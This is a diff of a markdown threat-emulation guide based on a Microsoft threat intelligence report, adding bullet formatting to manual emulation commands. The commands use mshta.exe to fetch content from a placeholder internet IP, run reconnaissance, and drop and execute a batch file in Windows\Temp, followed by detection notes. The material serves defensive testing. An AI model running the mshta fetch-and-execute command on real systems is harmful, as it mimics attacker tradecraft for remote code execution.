@@ -11,12 +11,12 @@ This threat is based on Microsoft Threat Intelligence Center (MSTIC) report post
 
 ## Emulate manually
 Open a command prompt and run these commands:
-``` C:\Windows\System32\mshta.exe http://<An Internet IP>```
-```cmd.exe /c whoami > whoami.txt```
+- ``` C:\Windows\System32\mshta.exe http://<An Internet IP>```
+- ```cmd.exe /c whoami > whoami.txt```
 ```cmd.exe /c dir > dir.txt```
-```cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat```
-```cmd.exe /c "C:\Windows\Temp\Serv-U.bat"```
-```powershell.exe "C:\Windows\Temp\Serv-U.bat"```
+- ```cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat```
+- ```cmd.exe /c "C:\Windows\Temp\Serv-U.bat"```
+- ```powershell.exe "C:\Windows\Temp\Serv-U.bat"```
 
 ## Detection & Response
 - An executable spawning mshta.exe
